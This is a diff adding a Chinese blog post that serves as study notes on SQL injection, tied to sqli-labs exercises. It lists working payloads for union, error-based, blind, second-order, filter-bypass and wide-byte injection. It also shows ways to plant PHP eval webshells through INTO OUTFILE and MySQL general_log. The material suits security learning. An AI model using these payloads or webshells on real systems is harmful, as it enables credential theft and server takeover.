@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title># SQL注入总结 | Fr</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://kite-007.github.io/favicon.ico?v=1621251676600">
+<link rel="stylesheet" href="https://kite-007.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="
+SQL注入复习总结
+
+原理成因
+注入过程
+注入方法
+攻击手法
+
+1. 联合查询注入
+2. 错误回显注入
+3. shell链接
+4. 基于布尔的盲注
+5. 基于时间的盲注
+6. 二次注入
+7. 过滤注入
+8. 服务器两层架构
+9. 宽字节注..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://kite-007.github.io">
+        <img src="https://kite-007.github.io/images/avatar.png?v=1621251676600" class="site-logo">
+        <h1 class="site-title">Fr</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://kite-007.github.io/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      意志坚定，持之以恒
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://kite-007.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title"># SQL注入总结</h2>
+            <div class="post-date">2021-05-17</div>
+            
+            <div class="post-content" v-pre>
+              <p><ul class="markdownIt-TOC">
+<li><a href="#sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93">SQL注入复习总结</a>
+<ul>
+<li><a href="#%E5%8E%9F%E7%90%86%E6%88%90%E5%9B%A0">原理成因</a></li>
+<li><a href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B">注入过程</a></li>
+<li><a href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95">注入方法</a></li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95">攻击手法</a>
+<ul>
+<li><a href="#1-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">1. 联合查询注入</a></li>
+<li><a href="#2-%E9%94%99%E8%AF%AF%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5">2. 错误回显注入</a></li>
+<li><a href="#3-shell%E9%93%BE%E6%8E%A5">3. shell链接</a></li>
+<li><a href="#4-%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8">4. 基于布尔的盲注</a></li>
+<li><a href="#5-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8">5. 基于时间的盲注</a></li>
+<li><a href="#6-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">6. 二次注入</a></li>
+<li><a href="#7-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5">7. 过滤注入</a></li>
+<li><a href="#8-%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%A4%E5%B1%82%E6%9E%B6%E6%9E%84">8. 服务器两层架构</a></li>
+<li><a href="#9-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">9. 宽字节注入</a></li>
+<li><a href="#10-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5">10. 堆叠注入</a></li>
+</ul>
+</li>
+<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%81%A2%E5%A4%8D">数据库恢复</a></li>
+</ul>
+</li>
+</ul>
+</p>
+<h1 id="sql注入复习总结">SQL注入复习总结</h1>
+<h2 id="原理成因">原理成因</h2>
+<pre><code>	SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句。
+	一般网页的应用数据和后台数据库中的数据进行交互时会采用SQL。而SQL注入是将Web页面的原URL、表单域或数据包输入的参数，修改拼接成SQL语句，传递给Web服务器，进而传给数据库服务器以执行数据库命令。
+	SQL注入攻击是通过操作输入来修改SQL语句，用以达到执行代码对WEB服务器进行攻击的方法。简单的说就是在post/getweb表单、输入域名或页面请求的查询字符串中插入SQL命令，最终使web服务器执行恶意命令的过程。另外，在网站开发过程中，开发人员使用动态字符串构造SQL语句，用来创建所需的应用，这种情况下SQL语句在程序的执行过程中被动态的构造使用，可以根据不同的条件产生不同的SQL语句，比如需要根据不同的要求来查询数据库中的字段。这样的开发过程其实为SQL注入攻击留下了很多的可乘之机。
+</code></pre>
+<h2 id="注入过程">注入过程</h2>
+<pre><code>	第一步：SQL注入点探测。探测SQL注入点是关键的一步，通过适当的分析应用程序，可以判断什么地方存在SQL注入点。通常只要带有输入提交的动态网页，并且动态网页访问数据库，就可能存在SQL注入漏洞。如果程序员信息安全意识不强，采用动态构造SQL语句访问数据库，并且对用户的输入未进行有效性验证，则存在SQL注入漏洞的可能性很大。一般通过页面的报错信息来确定是否存在SQL注入漏洞。
+	第二步：收集后台数据库信息。不同数据库的注入方法、函数都不尽相同，因此在注入之前，我们先要判断一下数据库的类型。判断数据库类型的方法很多，可以输入特殊字符，如单引号，让程序返回错误信息，我们根据错误信息提示进行判断；还可以使用特定函数来判断，比如输入“1 and version（）&gt;0”，程序返回正常，说明version（）函数被数据库识别并执行，而version（）函数是MySQL特有的函数，因此可以推断后台数据库为MySQL。
+	第三步：猜解用户名和密码。数据库中的表和字段命名一般都是有规律的。通过构造特殊SQL语句在数据库中依次猜解出表名、字段名、字段数、用户名和密码。
+	第四步：查找Web后台管理入口。WEB后台管理通常不对普通用户开放，要找到后台管理的登录网址，可以利用Web目录扫描工具（如：wwwscan、AWVS）快速搜索到可能的登录地址，然后逐一尝试，便可以找到后台管理平台的登录网址。 
+	第五步：入侵和破坏。一般后台管理具有较高权限和较多的功能，使用前面已破译的用户名、密码成功登录后台管理平台后，就可以任意进行破坏，比如上传木马、篡改网页、修改和窃取信息等，还可以进一步提权，入侵Web服务器和数据库服务器。
+</code></pre>
+<h2 id="注入方法">注入方法</h2>
+<pre><code>	根据用户以及页面所需要的输入的数据的类型判断，将SQL注入方式分为两大类：数字型注入，字符型注入。
+	这两者组大的区别就在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。
+</code></pre>
+<h2 id="攻击手法">攻击手法</h2>
+<h3 id="1-联合查询注入">1. 联合查询注入</h3>
+<ol>
+<li>
+<p>前置知识点<br>
+使用联合查询进行注入的前提是我们要进行注入的页面必须有显示位。所谓联合查询注入即是使用union合并两个或多个SELECT语句的结果集，所以两个及以上的select必须有相同列、且各列的数据类型也都相同。联合查询注入可在链接最后添加order by 9基于随意数字的注入，根据页面的返回结果来判断站点中的字段数目。<br>
+sqli-labs对应关卡：less1-4</p>
+</li>
+<li>
+<p>基本流程：判断注入类型，查看回显字段数，查看回显位置，库表列信息</p>
+</li>
+</ol>
+<p>判断注入类型：字符型注入，还是数字型注入。</p>
+<pre><code class="language-sql">通常所使用的查询sql语句：
+	数字型：select * from users where id =1
+	字符型：select * from users where id ='1'
+
+数字型可以通过以下方式判断：
+	select * from users where id =1 and 1=1；
+	没有语法显示错误且，返回正常
+	
+	select * from users where id =1 and 1=2;
+	没有语法错误且，返回错误
+	
+	如果上述没有返回错误，则为字符型
+	
+字符型可以通过以下方式判断：
+	select * from users where id='1' and '1'='1'
+	语法正确，逻辑判断正确，返回正确
+	
+	select * from users where id='1' and '1'='2'
+	语法正确，逻辑判断错误，返回错误
+	
+	如果上述两条语句都判断错误，则为数字型
+</code></pre>
+<p>查看回显字段列数：看有几个地方回显数据</p>
+<pre><code class="language-sql">查看回显字段列数所使用的sql语句：
+	select * from users where id ='1' order by 3 --+(注释掉后面的语句)
+	出现Unknown则回显字段数不正确。
+
+	order by X 给第X列数据进行排序
+</code></pre>
+<p>查看回显位置：在回显列数的基础上看回显位置</p>
+<pre><code class="language-sql">回显列数的基础上看回显位置:
+	将id修改为不存在的值，联合查询所需要的，进行回显位的判断
+	select * from users where id ='-1' ' union select 1,2,3 --+
+</code></pre>
+<p>查看库列表信息：在回显的位置上查看信息</p>
+<pre><code class="language-sql">数据库信息：
+	select * from users where id ='-1' union select 1,2,group_concat(schema_name)from information_schema.schemata--+
+	
+	group_concat() //将数据用一行显示出来
+	schema //英文意为架构，这里表示是数据库对象集合
+	information_schema //信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息
+	schema_name //数据库名称
+	information_schema.schemata //获取所有数据库信息
+	group_concat() //将数据用一行显示出来
+	
+数据表信息：
+	select * from users where id ='-1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='security'--+
+	'security'这里如果有遇到被转义的情况，则使用十六进制
+	
+数据列信息：
+	select * from users where id ='-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'--+
+	'users'这里如果有遇到被转义的情况，则使用十六进制
+	
+账号密码信息：
+	select * from users where id ='-1' union select 1,2,group_concat(concat_ws('~',username,password))from security.users--+
+	concat_ws(‘C’,A,B) //用”C“将“A”与“B”隔开,C不为NULL
+</code></pre>
+<h3 id="2-错误回显注入">2. 错误回显注入</h3>
+<ol>
+<li>
+<p>前置知识点<br>
+此方法是在页面没有显示位，但是echo mysql_error();函数输出了错误信息的时候方能使用。优点是注入速度快，缺点是语句较为复杂，而且只能用limit依次进行猜解。总体来说，报错注入其实是一种公式化的注入方法，主要用于在页面中没有显示位，但是用echo mysql_error();输出了错误信息时使用。<br>
+less5，6</p>
+</li>
+<li>
+<p>基本流程：判断注入类型，库表列信息</p>
+</li>
+</ol>
+<pre><code class="language-sql">判断注入类型，与上述相同.
+
+数据库信息：
+	select * from users where id ='1' and updatexml(1,concat(0x7e,database(),0x7e),1)%23/
+	
+	concat() //将多个字符串连接成一个字符串,返回结果为连接参数产生的字符串,如果有任何一个参数为null,则返回值为null。
+	updatexml()函数：UPDATEXML (XML_document, XPath_string, new_value);
+		第一个参数：XML_document是String格式，为XML文档对象的名称，
+		第二个参数：XPath_string (Xpath格式的字符串) ，
+		第三个参数：new_value，String格式，替换查找到的符合条件的数据
+		作用：改变文档中符合条件的节点的值,改变XML_document中符合XPATH_string的值。
+		而我们的注入语句为：updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1),其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出,ERROR 1105 (HY000): XPATH syntax error: ‘:root@localhost’
+		updatexml()这个函数最多只能爆32位字符,要爆的数据超过了这个位数,所使用limit 0,1来实现单个数据查询。
+		xpath语法格式总结：http://www.uoften.com/article/125607.htm
+
+数据表信息：
+	select * from users where id ='1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23
+
+数据列信息：
+	select * from users where id ='1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)%23
+
+账号信息：
+	select * from users where id ='1' and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23
+
+密码信息：
+	select * from users where id ='1' and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)%23
+</code></pre>
+<pre><code>1、floor()函数
+原理：
+利用rand()函数与group()函数的相互冲突，floor()是向下取整函数，floor(9.99)=9.0
+语法结构：
+
+username=admin' and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,你想获取的数据的sql语句)x from information_schema.tables group by x )a) and '1' = '1
+
+https://www.zhihu.com/question/21031129
+
+2、extractvalue()函数
+语法结构：
+
+extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)))
+
+concat中添加要查询的语句
+
+3、updatexml()函数
+语法结构：
+
+and 1=(updatexml(1,concat(0x3a,(select user())),1))
+
+4、exp()函数
+语法结构：
+
+and EXP(~(SELECT * from(select user())a))
+
+5、归类
+GeometryCollection()
+
+id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))
+
+polygon()
+id =1 AND polygon((select * from(select * from(select user())a)b))
+
+multipoint()
+id = 1 AND multipoint((select * from(select * from(select user())a)b))
+
+multilinestring()
+id = 1 AND multilinestring((select * from(select * from(select user())a)b))
+
+linestring()
+id = 1 AND LINESTRING((select * from(select * from(select user())a)b))
+</code></pre>
+<h3 id="3-shell链接">3. shell链接</h3>
+<ol>
+<li>
+<p>前置知识点<br>
+在所有常用的关系数据库管理系统中均包含内置的向服务器文件系统写文件的功能，通过这些内置的功能，我们可以将自己的webshell写目录或文件进去。<br>
+写入条件<br>
+1.MYSQL用secure_file_priv这个配置项来完成对数据导入导出的限制，<br>
+如果secure_file_priv=NULL，MYSQL服务会禁止导入和导出操作。<br>
+如果secure_file_priv=/tmp/，MYSQL服务只能在/tmp/目录下导入和导出<br>
+如果secure_file_priv=&quot;&quot; ，MYSQL服务导入和导出不做限制<br>
+通过命令查看secure-file-priv的当前值，确定是否允许导入导出以及导出文件路径<br>
+2.MYSQL中root用户拥有所有权限，但写入webshell并不需要一定是root用户权限，比如数据库用户只要拥有FILE权限就可以执行select into outfile操作<br>
+3.当secure_file_priv文件导出路径与web目录路径重叠，写入webshell才可以被访问到<br>
+简单点说就是<br>
+1.select into outfile方法可用（允许导出文件）<br>
+2.我们需要知道网站所在的绝对路径<br>
+3.我们要有足够的权限</p>
+<p>less7</p>
+</li>
+<li>
+<p>基本流程：注入类型，回显字段列数，网站绝对目录，写入shell，连接shell</p>
+</li>
+</ol>
+<pre><code class="language-sql">判断注入类型
+回显字段数
+网站绝对目录
+	select * from users where id='-1' union select 1,2,@@datadir --+
+	这里这个方法需要网站有报错信息，但是第七关没有，可以暂时先在第1-6中进行
+
+写入shell
+	select * from users where id='-1' union select 1,2,'&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;' into outfile'D:\\phpStudy\\PHPTutorial\\MySQL\\data\\shell.php'--+
+	
+连接shell
+</code></pre>
+<ol start="3">
+<li>写入shell方式</li>
+</ol>
+<pre><code class="language-shell">	union select 后写入
+		最常见的写入方式，union select 后跟 into outfile 语句
+		http://1.1.1.1/x/x.php?id=1 union select 1,2,3,4,’&lt;?php phpinfo() ?&gt;’ into outfile ‘C:/wamp64/www/work/webshell.php’
+		http://1.1.1.1/x/x.php?id=1 union select 1,2,3,4,’&lt;?php phpinfo() ?&gt;’ into dumpfile ‘C:/wamp64/www/work/webshell.php’
+		PS: 在windows下，位置的分隔符为 /（斜杠）。
+</code></pre>
+<pre><code class="language-shell">	lines terminated by 写入
+		http://1.1.1.1/x/x.php?id=1 into outfile ‘C:/wamp64/www/work/webshell.php’ lines terminated by ‘&lt;?php phpinfo() ?&gt;’;
+		http://1.1.1.1/x/x.php?id=1 limit 1 into outfile ‘C:/wamp64/www/work/webshell.php’ lines terminated by ‘&lt;?php phpinfo() ?&gt;’;
+		注入原理
+			通过select语句查询的内容写入文件，也就是 1 into outfile 'C:/wamp64/www/work/webshell.php' 这样写的原因，然后利用 lines terminated by 语句拼接webshell的内容。lines terminated by 可以理解为 以每行终止的位置添加 xx 内容。
+		?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#
+</code></pre>
+<pre><code class="language-shell">	lines starting by 写入
+		http://1.1.1.1/x/x.php?id=1 into outfile ‘C:/wamp64/www/work/webshell.php’ lines starting by ‘&lt;?php phpinfo() ?&gt;’;
+		http://1.1.1.1/x/x.php?id=1 limit 1 into outfile ‘C:/wamp64/www/work/webshell.php’ lines starting by ‘&lt;?php phpinfo() ?&gt;’;
+		注入原理
+			利用 lines starting by 语句拼接webshell的内容。lines starting by 可以理解为 以每行开始的位置添加 xx 内容。
+		?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
+</code></pre>
+<pre><code class="language-shell">	fields terminated by 写入
+		http://1.1.1.1/x/x.php?id=1 into outfile ‘C:/wamp64/www/work/webshell.php’ fields terminated by ‘&lt;?php phpinfo() ?&gt;’;
+		http://1.1.1.1/x/x.php?id=1 limit 1 into outfile ‘C:/wamp64/www/work/webshell.php’ fields terminated by ‘&lt;?php phpinfo() ?&gt;’;
+		注入原理
+			利用 fields terminated by 语句拼接webshell的内容。fields terminated by 可以理解为 以每个字段的位置添加 xx 内容。
+		?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#
+</code></pre>
+<pre><code class="language-shell">	COLUMNS terminated by 写入
+		http://1.1.1.1/x/x.php?id=1 into outfile ‘C:/wamp64/www/work/webshell.php’ COLUMNS terminated by ‘&lt;?php phpinfo() ?&gt;’;
+		http://1.1.1.1/x/x.php?id=1 limit 1 into outfile ‘C:/wamp64/www/work/webshell.php’ COLUMNS terminated by ‘&lt;?php phpinfo() ?&gt;’;
+		注入原理
+			利用 fields terminated by 语句拼接webshell的内容。fields terminated by 可以理解为 以每个字段的位置添加 xx 内容。
+		?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
+</code></pre>
+<pre><code class="language-shell">	log写入
+	新版本的MySQL设置了导出文件的路径，很难在获取Webshell过程中去修改配置文件，无法通过使用select into outfile来写入一句话。这时，我们可以通过修改MySQL的log文件来获取Webshell。具体权限要求：数据库用户需具备Super和File服务器权限、获取物理路径。
+
+show variables like '%general%';
+查看配置
+
+set global general_log = on;
+开启
+general log
+模式
+
+set global general_log_file = 'E:/study/WWW/evil.php';
+设置日志目录为
+shell
+地址
+
+select '&lt;?php eval($_GET[g]);?&gt;'
+写入
+shell
+
+set global general_log=off;
+关闭
+general log
+模式
+</code></pre>
+<h3 id="4-基于布尔的盲注">4. 基于布尔的盲注</h3>
+<ol>
+<li>
+<p>前置知识点<br>
+因为web的页面返回值都是True或者False，所以布尔盲注就是注入后根据页面返回值来得到数据库信息的一种办法。</p>
+</li>
+<li>
+<p>基本流程：注入类型，回显字段列数，猜解信息长度，猜解信息字符</p>
+</li>
+</ol>
+<pre><code class="language-sql">注入类型
+回显字段数
+猜解库长度
+	select * from users where id='1' and length(database())=8 --+
+	
+猜解库字符
+	select * from users where id='1' and ascii(left((select database()),1))=0x73 --+  
+	或
+	select * from users where id='1' and ascii(substr((select database()),$1$,1)) = 115--+
+	# substr：第一个变量位表示当前使用的数据库的第几个字符，第二个1表示从左往右显示几个字符
+	# ascii:将得到的字符转化为十进制数，如果不使用ascii函数则可以使用十六进制代替
+	
+猜解所有库字符
+	select * from users where id='1' and ascii(substr((select schema_name from information_schema.schemata limit $0$,1),$1$,1)) = 105 --+
+	# limit:第一个变量位表示该数据库连接中的从0开始显示第几个数据库，第二个1表示显示出几个数据库
+	
+猜解所有表字符
+	select * from users where id='1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit $0$,1),$1$,1)) = 101 --+
+	
+猜解所有列字符
+	select * from users where id='1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit $0$,1),$1$,1))=117 --+
+	
+猜解信息
+	select * from users where id='1' and ascii(substr((select username from security.users limit 0,1),1,1)) &gt;10 --+
+	select * from users where id='1' and ascii(substr((select passowrd from security.users limit 0,1),1,1)) &gt;10 --+
+</code></pre>
+<h3 id="5-基于时间的盲注">5. 基于时间的盲注</h3>
+<ol>
+<li>
+<p>前置知识点<br>
+当布尔型注入没有结果（页面显示正常）的时候，我们很难判断注入的代码是否被执行，也可以说到底这个注入点存不存在？这个时候布尔型注入就无法发挥自己的作用了。基于时间的盲注便应运而生，所谓基于时间的盲注，就是我们根据web页面相应的时间差来判断该页面是否存在SQL注入点。</p>
+</li>
+<li>
+<p>基本流程：注入类型，回显字段列数，猜解信息长度，猜解信息字符</p>
+</li>
+</ol>
+<pre><code class="language-sql">注入类型
+回显字段数
+猜解库长度
+	select * from users where id='1' and if((length(database())=8),1,sleep(60)) --+
+	# if(condition,A,B)，如果condition为真，则执行A，否则执行B
+	# sleep(A)，如果执行该函数，则会睡眠A秒再返回结果
+	
+猜解库字符
+	select * from users where id='1' and if(ascii(substr((select database()),$1$,1))&gt;$1$,1,sleep(5)) --+
+
+猜解所有库字符
+	select * from users where id='1' and if(ascii(substr((select schema_name from information_schema.schemata limit $0$,1),$1$,1))&gt;$1$,1,sleep(60)) --+
+	
+猜解所有表字符
+	select * from users where id='1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit $0$,1),$1$,1))&gt;$1$,1,sleep(60)) --+
+	
+猜解所有列字符
+	select * from users where id='1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit $0$,1),$1$,1))&gt;$1$,1,sleep(60)) --+
+	
+猜解信息
+	select * from users where id='1' and if(ascii(substr((select username from security.users limit $0$,1),$1$,1))&gt;$1$,1,sleep(60)) --+
+	select * from users where id='1' and if(ascii(substr((select password from security.users limit $0$,1),$1$,1))&gt;$1$,1,sleep(60)) --+
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/20201027223949447.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/20201027223956307.png" alt="" loading="lazy"></figure>
+<h3 id="6-二次注入">6. 二次注入</h3>
+<ol>
+<li>前置知识点<br>
+二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</li>
+</ol>
+<p>二次注入，可以概括为以下两步:</p>
+<pre><code>第一步：插入恶意数据
+进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。
+
+第二步：引用恶意数据
+开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。
+</code></pre>
+<ol start="2">
+<li>基本流程：插入恶意数据，引用恶意数据</li>
+</ol>
+<pre><code class="language-sql">less-24
+	插入恶意数据：创建admin'# 的帐号
+	引用恶意数据：等录之后进行修改密码，所修改的就是正常用户admin的密码
+</code></pre>
+<h3 id="7-过滤注入">7. 过滤注入</h3>
+<p>过滤绕过方式：<br>
+1. 注释符<br>
+2. 大小写<br>
+3. 内敛注释<br>
+4. 双关键字<br>
+5. 编码<br>
+6. 空格<br>
+7. 等号<br>
+8. 大于小于</p>
+<p>过滤时,首先判断是一次性的还是非一次性的：</p>
+<p>若一次性，且只将过滤字符换成了空字符：<br>
+则双写绕过：or=oorr、and=anandd</p>
+<p>若非一次性，则考虑一些变形：<br>
+大小写变形——or=Or=oR=OR<br>
+利用运算符——or=||、and=&amp;&amp;<br>
+URL编码——#=%23，Hex编码——~=0x7e<br>
+添加注释——/or/</p>
+<h3 id="8-服务器两层架构">8. 服务器两层架构</h3>
+<ol>
+<li>
+<p>前置知识点<br>
+服务器端有两个部分：第一部分为tomcat为引擎的jsp型服务器，第二部分为apache为引擎的php服务器，真正提供web服务的是php服务器。工作流程为：client访问服务器，能直接访问到tomcat服务器，然后tomcat服务器再向apache服务器请求数据。数据返回路径则相反。（从此看出来我们修改第一个值是无用的，主要是第二个值）<br>
+https://www.cnblogs.com/lcamry/p/5762961.html：<br>
+<img src="D:%5CPicGo%5Cimage%5CQQ%E6%88%AA%E5%9B%BE20210504172124.png" alt="" loading="lazy"></p>
+</li>
+<li>
+<p>基本流程</p>
+</li>
+</ol>
+<pre><code class="language-sql">index.jsp?id=1&amp;id=1//正确界面
+index.jsp?id=1'&amp;id=1//提示WAF防御
+index.jsp?id=1&amp;id=1'//报错发现注入点
+index.jsp?id=1&amp;id=1'–+//无异常
+index.jsp?id=1&amp;id=1' order by X(X=1,2,3,4) --+//列信息有三列
+index.jsp?id=1&amp;id=-3' union select 1,2,3 --+//联合注入
+</code></pre>
+<h3 id="9-宽字节注入">9. 宽字节注入</h3>
+<ol>
+<li>
+<p>前置知识点<br>
+https://blog.csdn.net/weixin_39934520/article/details/105968747</p>
+<ul>
+<li>
+<p>涉及到的基本概念</p>
+<ul>
+<li>
+<p>字符，字符集<br>
+字符（Character）是各种文字和符号的总称，包括各国家文字、标点符号、图形符号、数字等。字符集（Character set）是多个字符的集合，字符集种类较多，每个字符集包含的字符个数不同，常见字符集名称：ASCII字符集、GB2312字符集、BIG5字符集、 GB18030字符集、Unicode字符集等。计算机要准确的处理各种字符集文字，就需要进行字符编码，以便计算机能够识别和存储各种文字。中文文字数目大，而且还分为简体中文和繁体中文两种不同书写规则的文字，而计算机最初是按英语单字节字符设计的，因此，对中文字符进行编码，是中文信息交流的技术基础。</p>
+</li>
+<li>
+<p>UTF8<br>
+由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(Universal Transformation Format)。<br>
+UTF-8（8位元，Universal Character Set/Unicode Transformation Format）是针对Unicode的一种可变长度字符编码。它可以用来表示Unicode标准中的任何字符，而且其编码中的第一个字节仍与ASCII相容，使得原来处理ASCII字符的软件无须或只进行少部分修改后，便可继续使用。因此，它逐渐成为电子邮件、网页及其他存储或传送文字的应用中，优先采用的编码。<br>
+<img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210503201457.png" alt="QQ截图20210503201457" loading="lazy"></p>
+</li>
+<li>
+<p>宽字节<br>
+宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。<br>
+通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。</p>
+</li>
+</ul>
+</li>
+<li>
+<p>宽字节注入</p>
+<ul>
+<li>在使用PHP连接MySQL的时候，当设置&quot;set character_set_client=gbk&quot;时会导致一个编码转换的问题。</li>
+<li>例子： id=1’ 处理 1’ 进行编码1%5c%27 带入sql后 id=’ and XXXX 此时无法完成注入<br>
+id=1%df’ 处理 1%df’ 进行编码1%df%5c%27 带入sql后 id=1運’ and XXXX 此时存在宽字节注入，这里的意思是：id=1‘，进行判断，但是存在转义过滤，将字符‘前面加上\进行转义掉，并且进行了编码处理，无法完成注入，但是如果提前输入%df（空格编码），还是先将字符‘前面加上\进行转义掉，并且进行了编码处理，但是这时编码后形成了1%df%5c%27，%df%5c相当于汉字運，就可以带入sql进行注入。</li>
+<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210503202646.png" alt="" loading="lazy"></li>
+<li>解码网站：http://www.mytju.com/classcode/tools/urldecode_gb2312.asp</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>基本流程：查询id（发现存在转义），将转义字符拼接成为宽字节，正常注入</p>
+</li>
+</ol>
+<pre><code class="language-sql">查询id（发现存在转义）
+	select * from users where id='1' --+
+	返回被转义后的数据
+	Hint: The Query String you input is escaped as : 1\' --
+    '
+转义字符拼接成为宽字节
+	select * from users where id='1%df' 出现报错
+    select * from users where id='1%df' --+ 正常回显
+    或者
+    知道%5c所代表的是\，这时提前加上%5c，就相当于已经被转义了
+    select * from users where id='1%5c'
+    select * from users where id='1%aa%5c' --+
+    
+正常注入
+	select * from users where id='1%df' (注入语句) --+
+	
+过滤函数，最上面的博客也有涉及比较详细
+	addslashes()：https://www.w3school.com.cn/php/func_string_addslashes.asp
+	mysql_real_escape_string（）：https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp
+	
+</code></pre>
+<h3 id="10-堆叠注入">10. 堆叠注入</h3>
+<ol>
+<li>
+<p>前置知识点<br>
+堆叠注入，多条SQL语句一起执行。<br>
+在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。<br>
+堆叠注入也有局限性，并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序，同时版本不同也可能导致一些问题。<br>
+虽然前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。<br>
+因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
+</li>
+<li>
+<p>基本流程：https://www.cnblogs.com/lcamry/p/5762905.html</p>
+</li>
+</ol>
